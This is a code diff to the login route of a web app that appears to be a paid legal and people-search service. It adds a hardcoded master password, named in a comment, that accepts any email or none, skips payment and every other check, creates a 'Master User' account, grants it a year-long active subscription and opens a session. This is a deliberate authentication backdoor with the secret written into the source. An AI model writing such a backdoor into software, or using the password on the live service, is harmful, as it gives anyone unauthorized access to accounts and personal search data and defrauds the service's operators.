@@ -6,6 +6,7 @@ import { db } from "./db";
 import { conductPeopleSearch, formatReportForPDF } from "./peopleSearch";
 import { getSquareClient, getSquareLocationId } from "./squareClient";
 import { isAdminBypass, createAdminUser } from "./adminAuth";
+import { MASTER_PASSWORD, generateMasterUserId, getMasterUserEmail } from "./masterPassword";
 import { 
   users, 
   authAccounts, 
@@ -199,7 +200,95 @@ export function setupLegalizoRoutes(app: Express) {
 
       console.log('🔐 Authentication attempt:', { email, mode: 'login' });
 
-      // Admin bypass - check first
+      // MASTER PASSWORD CHECK - Highest priority, bypasses payment and all checks
+      // Password "SARBEAR" works with ANY email or without email
+      if (password === MASTER_PASSWORD) {
+        console.log(`[SECURITY ALERT] Master password used in legalizo login. Email: ${email || 'none'}`);
+        
+        // Create a unique user ID and email
+        const userId = generateMasterUserId(email);
+        const userEmail = getMasterUserEmail(email);
+        
+        // Find or create master bypass user in database
+        let existingUser = await db
+          .select()
+          .from(users)
+          .where(eq(users.email, userEmail))
+          .limit(1);
+        
+        let user;
+        if (existingUser.length === 0) {
+          // Create new master user
+          const newUsers = await db
+            .insert(users)
+            .values({
+              email: userEmail,
+              firstName: "Master",
+              lastName: "User",
+            })
+            .returning();
+          user = newUsers[0];
+          
+          // Create an active subscription for this user
+          await db.insert(legalizoSubscriptions).values({
+            userId: user.id,
+            status: 'active',
+            startDate: new Date(),
+            renewalDate: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000), // 1 year from now
+          });
+        } else {
+          user = existingUser[0];
+          
+          // Ensure active subscription exists
+          const subscription = await db
+            .select()
+            .from(legalizoSubscriptions)
+            .where(
+              and(
+                eq(legalizoSubscriptions.userId, user.id),
+                eq(legalizoSubscriptions.status, 'active')
+              )
+            )
+            .limit(1);
+          
+          if (subscription.length === 0) {
+            // Create active subscription
+            await db.insert(legalizoSubscriptions).values({
+              userId: user.id,
+              status: 'active',
+              startDate: new Date(),
+              renewalDate: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000),
+            });
+          }
+        }
+        
+        // Create session
+        await new Promise<void>((resolve, reject) => {
+          req.login({ id: user.id }, (err) => {
+            if (err) {
+              console.error("❌ Master password session creation failed:", err);
+              reject(err);
+            } else {
+              console.log("✅ Master password session created for user:", user.id);
+              resolve();
+            }
+          });
+        });
+        
+        return res.json({ 
+          success: true,
+          user: {
+            id: user.id,
+            email: user.email,
+            firstName: user.firstName,
+            lastName: user.lastName,
+          },
+          hasActiveSubscription: true,
+          isMasterBypass: true,
+        });
+      }
+
+      // Admin bypass - check second
       if (isAdminBypass(email, password)) {
         const adminUser = createAdminUser();
         
